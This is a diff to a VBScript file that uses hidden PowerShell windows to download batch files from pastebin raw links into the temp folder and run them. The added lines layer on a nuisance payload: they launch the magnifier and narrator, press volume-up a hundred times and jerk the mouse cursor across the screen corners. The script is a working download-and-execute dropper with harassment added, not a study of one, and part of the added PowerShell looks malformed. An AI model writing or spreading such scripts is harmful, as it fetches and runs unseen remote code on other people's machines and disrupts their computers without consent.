@@ -2,7 +2,31 @@ Set WshShell = CreateObject("WScript.Shell")
     
     WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/wCbsqrNY','%TEMP%\pingyoutube.bat'); Start-Process %TEMP%\pingyoutube.bat""", 0, False
     WScript.Sleep 2000
+    Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run "magnify.exe", 1, False
+    Set WshShell = CreateObject("WScript.Shell")
+
+' Verhoog volume 10 keer
+For i = 1 To 100
+    WshShell.SendKeys Chr(175) ' 175 = Volume Up
+    WScript.Sleep 400
+Next
+    Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run "narrator", 0, False
     WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/TiNThhxW','%TEMP%\relaunchping.bat'); Start-Process %TEMP%\relaunchping.bat""", 0, False
+    Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run "powershell -w hidden -c ^
+$pos = @( ^
+  @{X=0; Y=0}, ^
+  @{X=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width; Y=0}, ^
+  @{X=0; Y=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height}, ^
+  @{X=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width; Y=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height} ^
+); ^
+Add-Type -AssemblyName System.Windows.Forms; ^
+foreach ($p in $pos) { ^
+  [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($p.X - 1, $p.Y - 1); ^
+  Start-Sleep -Milliseconds 300 ^
+}"
     WScript.Sleep 5000
 
 Do
